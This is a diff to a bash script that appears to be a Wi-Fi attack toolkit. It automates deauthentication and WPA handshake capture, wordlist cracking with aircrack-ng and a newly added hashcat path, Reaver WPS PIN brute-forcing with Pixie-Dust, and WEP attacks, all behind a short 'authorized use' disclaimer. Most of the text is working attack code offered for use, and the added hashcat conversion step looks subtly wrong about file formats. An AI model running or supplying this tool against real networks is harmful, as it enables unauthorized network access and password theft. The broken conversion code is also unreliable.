@@ -4,14 +4,14 @@
 set -euo pipefail
 
 # =============================
-# GLOBAL VARIABLES (PORTABLE)
+# GLOBAL VARIABLES
 # =============================
 
 isKali=0
 isKaliTwo=0
 linuxVersion=""
 
-# Paths (detected at runtime)
+# Paths (detected dynamically)
 pathAircrack=""
 pathAireplay=""
 pathAirodump=""
@@ -32,13 +32,8 @@ pathTail=""
 pathWash=""
 pathWget=""
 
-# Statuses
+# Status for all tools (including hashcat)
 declare -A dep_status
-
-# Date/Time
-currentDate=""
-currentTime=""
-currentDateTime=""
 
 # Colors
 RED='\033[0;31m'
@@ -47,16 +42,14 @@ YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m'
 
-# Auto-detected interface
+# Interface & attack vars
 interface=""
 monitor_interface=""
-
-# Attack vars
 channel=""
 bssid=""
 essid=""
 
-# Attack defaults (no hardcoded paths)
+# Attack defaults
 deauth_count=5
 wep_ivs_target=10000
 wep_attack="chopchop"
@@ -68,15 +61,23 @@ session_name=""
 session_dir=""
 
 # =============================
-# BANNERS
+# BANNER WITH ASCII LOGO
 # =============================
 
 banner() {
     echo -e "${GREEN}"
-    echo "=========================================="
-    echo "      Portable WiFi Toolkit v1.0"
-    echo "=========================================="
+    cat << "EOF"
+ ██╗    ██╗██╗███████╗████████╗██╗     ██████╗ 
+ ██║    ██║██║██╔════╝╚══██╔══╝██║     ██╔══██╗
+ ██║ █╗ ██║██║███████╗   ██║   ██║     ██████╔╝
+ ██║███╗██║██║╚════██║   ██║   ██║     ██╔══██╗
+ ╚███╔███╔╝██║███████║   ██║   ███████╗██████╔╝
+  ╚══╝╚══╝ ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═════╝ 
+EOF
     echo -e "${NC}"
+    echo "        Portable WiFi Penetration Toolkit"
+    echo "   AllReserved(c)2026 Adikoto IndoCraetive.Ltd"
+    echo "=============================================="
 }
 
 bannerStats() {
@@ -107,7 +108,6 @@ initMain() {
 
     resizeWindow
     setAttackDefaults
-
     setDefaultSession
     showDisclaimer
     menuMain
@@ -135,14 +135,14 @@ checkLinuxVersion() {
 
 detectInterface() {
     echo -e "${YELLOW}[*] Detecting wireless interface...${NC}"
-    for iface in $(ls /sys/class/net/ | grep -E '^wl'); do
+    for iface in $(ls /sys/class/net/ 2>/dev/null | grep -E '^wl'); do
         if iwconfig "$iface" &> /dev/null; then
             interface="$iface"
             echo -e "${GREEN}[+] Found: $interface${NC}"
             return 0
         fi
     done
-    echo -e "${RED}[!] No wireless interface found. Please specify manually.${NC}"
+    echo -e "${RED}[!] No wireless interface found.${NC}"
     read -p "Enter interface name (e.g., wlan0): " interface
 }
 
@@ -162,10 +162,7 @@ resizeWindow() {
     printf '\e[8;30;90t' 2>/dev/null || true
 }
 
-setAttackDefaults() {
-    : # All defaults are already set as variables above
-}
-
+setAttackDefaults() { :; }
 setDefaultSession() {
     session_name="portable_session_$(date +%s)"
     session_dir="/tmp/${session_name}"
@@ -176,10 +173,10 @@ showDisclaimer() {
     clear
     banner
     echo -e "${RED}DISCLAIMER:${NC}"
-    echo "This tool is for authorized use ONLY."
-    echo "Unauthorized network access is illegal."
+    echo "This tool is for authorized penetration testing ONLY."
+    echo "Unauthorized use is illegal. You assume all liability."
     echo ""
-    echo -n "Do you accept? (y/N): "
+    echo -n "Do you accept these terms? (y/N): "
     read -r response
     if [[ ! "$response" =~ ^[Yy]$ ]]; then
         echo "Exiting."
@@ -189,7 +186,7 @@ showDisclaimer() {
 }
 
 # =============================
-# DEPENDENCY HANDLING (PORTABLE)
+# DEPENDENCY HANDLING
 # =============================
 
 findDependencies() {
@@ -213,6 +210,7 @@ findDependencies() {
         tail
         wash
         wget
+        hashcat
     )
 
     echo -e "${YELLOW}[*] Locating dependencies...${NC}"
@@ -238,7 +236,7 @@ checkDependencies() {
         fi
     done
     if [ $missing -gt 0 ]; then
-        echo -e "${RED}[!] Critical tools missing. Install aircrack-ng suite.${NC}"
+        echo -e "${RED}[!] Critical tools missing. Run: sudo ./install.sh${NC}"
         exit 1
     fi
 }
@@ -277,7 +275,7 @@ disableMonitorMode() {
 }
 
 # =============================
-# ATTACK FUNCTIONS (PORTABLE)
+# ATTACK FUNCTIONS
 # =============================
 
 crackWPAHandshake() {
@@ -287,20 +285,59 @@ crackWPAHandshake() {
         return 1
     fi
 
-    echo -e "${BLUE}[*] To crack WPA, you need a wordlist.${NC}"
     read -p "Enter wordlist path (e.g., ./wordlist.txt): " wordlist_file
-
     if [ ! -f "$wordlist_file" ]; then
         echo -e "${RED}[!] Wordlist not found: $wordlist_file${NC}"
         return 1
     fi
 
-    echo -e "${GREEN}[*] Cracking with: $wordlist_file${NC}"
+    echo -e "${GREEN}[*] Cracking with Aircrack-ng...${NC}"
     num_cores=$(nproc 2>/dev/null || echo 2)
-
     if "$pathAircrack" -w "$wordlist_file" "$cap_file" -l "$session_dir/password.txt" --workers "$num_cores" 2>/dev/null; then
         if [ -s "$session_dir/password.txt" ]; then
             password=$(cat "$session_dir/password.txt")
+            echo -e "\n${GREEN}[+] PASSWORD FOUND: $password${NC}"
+            echo "$password" >> "$session_dir/found_passwords.txt"
+            return 0
+        fi
+    fi
+    echo -e "${RED}[!] Password not found.${NC}"
+    return 1
+}
+
+crackWPAWithHashcat() {
+    local cap_file="$session_dir/handshake-01.cap"
+    local hccapx_file="$session_dir/handshake.hccapx"
+
+    if [ ! -f "$cap_file" ]; then
+        echo -e "${RED}[!] Handshake file not found.${NC}"
+        return 1
+    fi
+
+    if [ "${dep_status[hashcat]:-}" != "OK" ]; then
+        echo -e "${RED}[!] Hashcat not installed. Run: sudo ./install.sh${NC}"
+        return 1
+    fi
+
+    read -p "Enter wordlist path for Hashcat: " wordlist_file
+    if [ ! -f "$wordlist_file" ]; then
+        echo -e "${RED}[!] Wordlist not found.${NC}"
+        return 1
+    fi
+
+    echo -e "${BLUE}[*] Converting to hccapx format...${NC}"
+    "$pathAircrack" "$cap_file" -J "$session_dir/handshake" >/dev/null 2>&1
+
+    if [ ! -f "$session_dir/handshake.hccapx" ]; then
+        echo -e "${RED}[!] Failed to convert to hccapx.${NC}"
+        return 1
+    fi
+
+    echo -e "${GREEN}[*] Cracking with Hashcat (mode 22000)...${NC}"
+    if hashcat -m 22000 "$hccapx_file" "$wordlist_file" --force --quiet; then
+        result=$(hashcat -m 22000 "$hccapx_file" --show 2>/dev/null)
+        if [ -n "$result" ]; then
+            password=$(echo "$result" | cut -d: -f2-)
             echo -e "\n${GREEN}[+] PASSWORD FOUND: $password${NC}"
             echo "$password" >> "$session_dir/found_passwords.txt"
             return 0
@@ -338,17 +375,23 @@ attackWPA() {
                 echo -e "${GREEN}[+] Handshake captured!${NC}"
                 kill $AIRODUMP_PID 2>/dev/null || true
 
-                echo -n -e "${YELLOW}Crack now? (y/N): ${NC}"
-                read -r choice
-                if [[ "$choice" =~ ^[Yy]$ ]]; then
-                    crackWPAHandshake
-                fi
+                echo -e "${YELLOW}Choose cracking method:${NC}"
+                echo "1) Aircrack-ng (CPU)"
+                echo "2) Hashcat (GPU - faster)"
+                echo -n "Option (1/2): "
+                read -r method
+
+                case $method in
+                    1) crackWPAHandshake ;;
+                    2) crackWPAWithHashcat ;;
+                    *) echo "Skipping crack." ;;
+                esac
                 return 0
             fi
         fi
 
         if [ $(( $(date +%s) - start_time )) -ge $wpa2_handshake_timeout ]; then
-            echo -e "${RED}[!] Timeout.${NC}"
+            echo -e "${RED}[!] Timeout: Handshake not captured.${NC}"
             break
         fi
         sleep 2
@@ -368,14 +411,14 @@ attackWPS() {
     fi
 
     ensureMonitorMode "$interface"
-    echo -e "${GREEN}[*] Checking WPS...${NC}"
+    echo -e "${GREEN}[*] Scanning for WPS...${NC}"
 
     if ! timeout 10 "$pathWash" -i "$monitor_interface" -c "$target_channel" 2>/dev/null | grep -q "$target_bssid"; then
-        echo -e "${RED}[!] WPS not active.${NC}"
+        echo -e "${RED}[!] WPS not active or not detected.${NC}"
         return 1
     fi
 
-    echo -e "${BLUE}[*] Launching Reaver...${NC}"
+    echo -e "${BLUE}[*] Launching Reaver (Pixie-Dust: $wps_pixie_mode)...${NC}"
     local reaver_opts="-i $monitor_interface -b $target_bssid -c $target_channel -vv"
     [ "$wps_pixie_mode" -eq 1 ] && reaver_opts="$reaver_opts -K 1"
 
@@ -383,11 +426,11 @@ attackWPS() {
     REAVER_PID=$!
 
     if timeout $wps_pin_timeout grep -m1 "WPS PIN:" "$session_dir/reaver.log" >/dev/null 2>&1; then
-        echo -e "${GREEN}[+] WPS PIN found!${NC}"
+        echo -e "${GREEN}[+] WPS PIN found! See $session_dir/reaver.log${NC}"
         kill $REAVER_PID 2>/dev/null || true
         return 0
     else
-        echo -e "${RED}[!] Reaver failed.${NC}"
+        echo -e "${RED}[!] Reaver failed within $wps_pin_timeout seconds.${NC}"
         kill $REAVER_PID 2>/dev/null || true
         return 1
     fi
@@ -436,7 +479,7 @@ attackWEP() {
 }
 
 # =============================
-# MENU
+# MAIN MENU
 # =============================
 
 menuMain() {
@@ -445,11 +488,11 @@ menuMain() {
         banner
         bannerStats
         echo "=== MAIN MENU ==="
-        echo "1) WPA/WPA2 Attack"
-        echo "2) WPS Attack"
+        echo "1) WPA/WPA2 Attack (Handshake + Crack)"
+        echo "2) WPS Attack (Reaver + PixieDust)"
         echo "3) WEP Attack"
         echo "4) Exit"
-        echo -n "Choose: "
+        echo -n "Choose option: "
         read -r opt
 
         case $opt in
@@ -458,19 +501,19 @@ menuMain() {
                 read -p "Channel: " channel
                 read -p "ESSID (optional): " essid
                 attackWPA "$bssid" "$channel" "$essid"
-                read -p "Press ENTER..."
+                read -p "Press ENTER to return..."
                 ;;
             2)
                 read -p "BSSID: " bssid
                 read -p "Channel: " channel
                 attackWPS "$bssid" "$channel"
-                read -p "Press ENTER..."
+                read -p "Press ENTER to return..."
                 ;;
             3)
                 read -p "BSSID: " bssid
                 read -p "Channel: " channel
                 attackWEP "$bssid" "$channel"
-                read -p "Press ENTER..."
+                read -p "Press ENTER to return..."
                 ;;
             4)
                 disableMonitorMode "$monitor_interface"
@@ -478,7 +521,7 @@ menuMain() {
                 exit 0
                 ;;
             *)
-                echo "Invalid."
+                echo "Invalid option."
                 sleep 1
                 ;;
         esac
@@ -491,7 +534,7 @@ menuMain() {
 
 main() {
     if [ "$EUID" -ne 0 ]; then
-        echo -e "${RED}[!] Run as root: sudo $0${NC}"
+        echo -e "${RED}[!] Please run as root: sudo $0${NC}"
         exit 1
     fi
     initMain "$@"
